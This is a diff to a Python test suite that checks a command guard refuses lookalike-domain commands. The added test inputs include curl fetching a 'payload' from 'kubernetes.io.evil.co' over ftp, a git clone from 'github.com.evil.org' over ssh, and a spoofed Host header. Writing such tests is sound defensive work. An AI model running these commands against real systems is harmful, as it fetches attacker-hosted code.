@@ -101,6 +101,15 @@ def main() -> int:
         delim_res = ap.check_all_command_guards("TARGETS=a.com,kubernetes.io.evil.co", "local")
         check("chained delimiter lookalike refused", delim_res.get("approved"), False)
 
+        ftp_res = ap.check_all_command_guards("curl ftp://kubernetes.io.evil.co/payload", "local")
+        check("ftp scheme lookalike refused", ftp_res.get("approved"), False)
+
+        ssh_res = ap.check_all_command_guards("git clone ssh://github.com.evil.org/repo", "local")
+        check("ssh scheme lookalike refused", ssh_res.get("approved"), False)
+
+        colon_res = ap.check_all_command_guards('curl -H "Host:kubernetes.io.evil.co" https://10.0.0.1', "local")
+        check("colon delimiter lookalike refused", colon_res.get("approved"), False)
+
     # --- 5. Read-only allowlist policy for high risk ------------------------
     ap.detect_dangerous_command = lambda cmd: (True, "rm", "recursive delete") if "rm" in cmd else (False, "", "")
 
